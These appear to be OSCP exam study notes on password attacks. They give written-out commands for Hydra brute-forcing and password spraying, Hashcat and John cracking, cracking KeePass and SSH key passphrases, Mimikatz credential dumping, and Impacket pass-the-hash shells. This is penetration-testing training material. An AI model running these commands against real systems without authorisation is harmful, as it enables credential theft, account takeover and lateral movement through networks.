# Module 16 : Password Attacks


---

## Commonly used wordlists
```bash
#Name wordlists (used for password spraying)
/usr/share/wordlists/dirb/others/names.txt

#Intensive, standard go to brute force password
/usr/share/wordlists/rockyou.txt

#Smallest to largest, less intensive
/usr/share/wordlists/metasploit/http_default_pass.txt
/usr/share/wordlists/dirb/others/best110.txt
/usr/share/seclists/Passwords/Common-Credentials/top-1000.txt
/usr/share/wordlists/fasttrack.txt # Always preferred for OSCP
```

---

## Hydra reference

**SSH brute force:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

**RDP brute force:**
```bash
hydra -l admin -P wordlist.txt rdp://<target>
```

**FTP brute force:**
```bash
hydra -l admin -P wordlist.txt ftp://<target>
```

**HTTP POST login form:**
```bash
hydra -l admin -P wordlist.txt <target> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

The three colon-separated parts are:
- Login page path
- POST body with `^USER^` and `^PASS^` as placeholders
- Failure string — text that appears on a failed login

**HTTP GET (basic auth):**
```bash
hydra -l admin -P wordlist.txt <target> http-get /admin/

```
> Pop up asking for username and password on website

**Password Spraying**
```bash
hydra -L name_wordlist.txt -p "SuperSecretPassword!" rdp://<target>
```

---

**Key flags:**
- `-l` — single username
- `-L` — username wordlist
- `-p` — single password
- `-P` — password wordlist
- `-t` — threads (keep low, 10-16, to avoid crashes)
- `-s` — specify non-default port
- `-f` — stop after first valid login
- `-V` — verbose, shows each attempt

**Example with non-standard port:**
```bash
hydra -l admin -P wordlist.txt -s 8080 -f <target> http-post-form "/login:user=^USER^&pass=^PASS^:Failed"
```

---

## Hashcat Reference 

**Hashcat — quick reference**

**Basic syntax:**
```bash
hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Common hash modes (-m):**

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 400 | phpass (WordPress) |
| 1000 | NTLM (Windows) |
| 1800 | SHA-512 (Linux /etc/shadow) |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 13100 | Kerberoasting (TGS-REP) |
| 18200 | AS-REP Roasting |

**Don't know the hash type?**
```bash
hashid <hash_string>
hash-identifier
```

**With rules (smarter cracking):**
```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Show cracked passwords:**
```bash
hashcat -m 1000 hashes.txt --show
```

**Force CPU if no GPU:**
```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --force
```

**Example**
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

**Show Password (from specific example)**
```bash
hashcat -m 13400 keepass_hashcat.hash --show
```

**Key flags:**
- `-m` — hash mode
- `-a 0` — dictionary attack (most common)
- `-a 3` — brute force mask attack
- `-r` — rules file
- `--force` — run on CPU when no GPU available
- `--show` — display already cracked results
- `-o` — output cracked hashes to file

**John the Ripper alternative (simpler syntax):**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

John auto-detects hash type so no `-m` needed. Use John when you're unsure of the hash type, use Hashcat when you know it and want speed.

**For OSCP specifically:**
Modes 1000 (NTLM) and 5600 (NetNTLMv2) are the most common — you'll dump these from Windows machines and AD environments constantly.

---

## 16.2.3. Cracking methodology

1. Extract hashes
2. Format hashes
3. Calculate the cracking time
4. Prepare wordlist
5. Attack the hash

---

### keepass

`.kdbx` is a **KeePass password database** file. KeePass is a password manager — it stores all of a user's passwords in one encrypted file.

If you can crack the master password for this database, you get access to **every password stored inside it**. That could include SSH credentials, admin passwords, database logins — everything.

**The OSCP workflow:**

1. Find the `.kdbx` file (you just did this)
2. Extract the hash for cracking:
```bash
keepass2john Database.kdbx > keepass_hash.txt
```
3. Crack it with hashcat or john:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
#Shows password after cracked.
john --show keepass_hash.txt
```
4. Open the database with the cracked password:
```bash
kpcli --kdb Database.kdbx
```

> hashcat and johntheripper have different formats. Hashcat takes only pure hash while John has Database: (For this case.)

---

### ssh

**SSH private key cracking workflow:**

**Step 1 — Find the private key:**
Via LFI, directory traversal, or on a compromised machine:
```
/home/<user>/.ssh/id_rsa
```

**Step 2 — Check if it's passphrase protected:**
```bash
ssh -i id_rsa user@target
```
If it asks for a passphrase (not a password) → the key is encrypted.

**Step 3 — Extract the hash:**
```bash
ssh2john id_rsa > ssh_hash.txt
```

**Step 4 — Crack with John:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```

**Step 5 — Show cracked passphrase:**
```bash
john --show ssh_hash.txt
```

**Step 6 — Use the key with the passphrase:**
```bash
chmod 400 id_rsa
ssh -i id_rsa user@target
# Enter the cracked passphrase when prompted
```

**The pattern is identical to KeePass:**
1. Find the encrypted file
2. Extract hash with `<tool>2john`
3. Crack with john or hashcat
4. Use the cracked password to open it

This same pattern works for almost anything:
- `keepass2john` → KeePass
- `ssh2john` → SSH keys
- `zip2john` → encrypted zip files
- `rar2john` → encrypted rar files
- `office2john` → password protected Office docs

---

## Mimikatz 

**Mimikatz** — a Windows post-exploitation tool that extracts credentials from memory.

**What it can do:**

1. **Dump plaintext passwords** from Windows memory (LSASS process)
2. **Extract NTLM hashes** from logged-in users
3. **Perform Pass-the-Hash** — authenticate using a hash without knowing the password
4. **Kerberos attacks** — extract and forge tickets (Golden/Silver Ticket)
5. **Dump SAM database** — local user password hashes

**Key commands you'll use:**

```powershell
mimikatz.exe
privilege::debug #permission to access memory
token::elevate # escalate to SYSTEM, requires admin/SYSTEM priv
sekurlsa::logonpasswords #dump everything
lsadump::sam #dump sam file passwords
```

This dumps credentials for all users currently or recently logged into the machine.

**Why it matters for OSCP:**

After getting admin/SYSTEM on a Windows box, run Mimikatz to extract credentials. Those credentials often work on other machines in the network — that's lateral movement, especially critical in the AD section.

---

## Impacket

**Impacket** — a collection of Python tools for interacting with Windows network protocols. It's your Swiss army knife for attacking Windows machines from Kali.

**impacket-psexec** — gives you a SYSTEM shell on a remote Windows machine using credentials or hashes.

```bash
# With password
impacket-psexec Administrator:password@192.168.177.212

# With NTLM hash (Pass-the-Hash)
impacket-psexec Administrator@192.168.177.212 -hashes :7a38310ea6f0027ee955abed1762964b
```

It works by uploading a service binary to the target via SMB, creating a Windows service, and executing it — giving you a SYSTEM shell.

**Other important Impacket tools for OSCP:**

```bash
# Remote shell (similar to psexec, different method)
impacket-wmiexec Administrator@target -hashes :hash

# Dump credentials remotely without touching the target
impacket-secretsdump Administrator@target -hashes :hash

# MSSQL client
impacket-mssqlclient sa:password@target -windows-auth

# Kerberos attacks (AD)
impacket-GetNPUsers domain/user -dc-ip target
impacket-GetUserSPNs domain/user:password -dc-ip target
```

**Why Impacket matters:**
It lets you do everything from Kali without uploading tools to the target. No need to transfer Mimikatz if you can run `secretsdump` remotely.

**Key distinction:**
- `psexec` → gives you a shell
- `wmiexec` → gives you a shell (stealthier, no service created)
- `secretsdump` → dumps credentials without a shell

These become essential in AD modules 22-24.